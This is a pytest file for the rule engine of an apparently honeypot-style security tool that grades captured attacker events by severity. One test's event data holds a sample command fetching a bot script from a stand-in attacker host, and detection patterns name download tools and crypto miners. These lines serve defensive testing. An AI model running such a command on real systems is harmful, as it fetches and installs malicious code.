"""Tests for the classification engine."""
import pytest
from unittest.mock import patch, MagicMock

from meli.classification.severity import classify_event, _rule_matches, _condition_matches
from meli.classification.rules import RuleLoader


class TestConditionMatching:
    def test_eq_match(self):
        cond = {"field": "action_type", "operator": "eq", "value": "login_attempt"}
        event = {"action_type": "login_attempt"}
        assert _condition_matches(cond, event) is True

    def test_eq_no_match(self):
        cond = {"field": "action_type", "operator": "eq", "value": "command"}
        event = {"action_type": "login_attempt"}
        assert _condition_matches(cond, event) is False

    def test_eq_case_insensitive(self):
        cond = {"field": "severity", "operator": "eq", "value": "HIGH"}
        event = {"severity": "high"}
        assert _condition_matches(cond, event) is True

    def test_in_match(self):
        cond = {"field": "action_type", "operator": "in",
                "value": ["login_attempt", "successful_auth"]}
        event = {"action_type": "successful_auth"}
        assert _condition_matches(cond, event) is True

    def test_in_no_match(self):
        cond = {"field": "action_type", "operator": "in", "value": ["command", "file_upload"]}
        event = {"action_type": "login_attempt"}
        assert _condition_matches(cond, event) is False

    def test_regex_match(self):
        cond = {"field": "command", "operator": "regex",
                "value": "(wget|curl|python)"}
        event = {"command": "wget http://evil.example.com/bot.sh"}
        assert _condition_matches(cond, event) is True

    def test_regex_no_match(self):
        cond = {"field": "command", "operator": "regex", "value": "xmrig|minerd"}
        event = {"command": "ls -la /tmp"}
        assert _condition_matches(cond, event) is False

    def test_exists_with_value(self):
        cond = {"field": "payload_hash", "operator": "exists"}
        event = {"payload_hash": "abc123"}
        assert _condition_matches(cond, event) is True

    def test_exists_without_value(self):
        cond = {"field": "payload_hash", "operator": "exists"}
        event = {"action_type": "connection"}
        assert _condition_matches(cond, event) is False

    def test_gte_match(self):
        cond = {"field": "attacker_event_count", "operator": "gte", "value": 5}
        event = {"attacker_event_count": 10}
        assert _condition_matches(cond, event) is True

    def test_gte_no_match(self):
        cond = {"field": "attacker_event_count", "operator": "gte", "value": 20}
        event = {"attacker_event_count": 3}
        assert _condition_matches(cond, event) is False


class TestRuleMatching:
    def test_rule_matches_all_conditions(self):
        rule = {
            "name": "Test",
            "severity": "HIGH",
            "conditions": [
                {"field": "action_type", "operator": "eq", "value": "successful_auth"},
            ]
        }
        event = {"action_type": "successful_auth", "source_ip": "1.2.3.4"}
        assert _rule_matches(rule, event) is True

    def test_rule_fails_if_any_condition_fails(self):
        rule = {
            "name": "Test",
            "severity": "CRITICAL",
            "conditions": [
                {"field": "action_type", "operator": "eq", "value": "file_upload"},
                {"field": "payload_hash", "operator": "exists"},
            ]
        }
        event = {"action_type": "file_upload"}  # no payload_hash
        assert _rule_matches(rule, event) is False

    def test_empty_conditions_returns_false(self):
        rule = {"name": "Empty", "severity": "HIGH", "conditions": []}
        assert _rule_matches(rule, {}) is False


class TestClassifyEvent:
    @patch("meli.classification.severity._loader")
    def test_classify_critical_malware(self, mock_loader):
        mock_loader.get_rules.return_value = [
            {
                "name": "Malware payload",
                "severity": "CRITICAL",
                "priority": 10,
                "conditions": [
                    {"field": "action_type", "operator": "in", "value": ["file_upload", "file_download"]},
                    {"field": "payload_hash", "operator": "exists"},
                ]
            }
        ]
        event = {
            "action_type": "file_download",
            "payload_hash": "deadbeef1234",
            "source_ip": "1.2.3.4",
        }
        severity, rules = classify_event(event)
        assert severity == "CRITICAL"
        assert "Malware payload" in rules

    @patch("meli.classification.severity._loader")
    def test_classify_returns_highest_severity(self, mock_loader):
        mock_loader.get_rules.return_value = [
            {
                "name": "Low rule",
                "severity": "LOW",
                "priority": 40,
                "conditions": [{"field": "action_type", "operator": "eq", "value": "login_attempt"}]
            },
            {
                "name": "High rule",
                "severity": "HIGH",
                "priority": 20,
                "conditions": [{"field": "action_type", "operator": "eq", "value": "login_attempt"}]
            },
        ]
        event = {"action_type": "login_attempt", "source_ip": "1.2.3.4"}
        severity, rules = classify_event(event)
        assert severity == "HIGH"
        assert len(rules) == 2

    @patch("meli.classification.severity._loader")
    def test_classify_default_info(self, mock_loader):
        mock_loader.get_rules.return_value = []
        event = {"action_type": "connection", "source_ip": "1.2.3.4"}
        severity, rules = classify_event(event)
        assert severity == "INFO"
        assert rules == []


class TestRuleLoader:
    def test_loads_default_rules(self):
        loader = RuleLoader()
        rules = loader.get_rules()
        assert len(rules) > 0
        assert all("name" in r and "severity" in r and "conditions" in r for r in rules)

    def test_invalidate_forces_reload(self):
        loader = RuleLoader()
        _ = loader.get_rules()  # loads once
        loader.invalidate()
        assert loader._loaded is False
        rules = loader.get_rules()
        assert len(rules) > 0
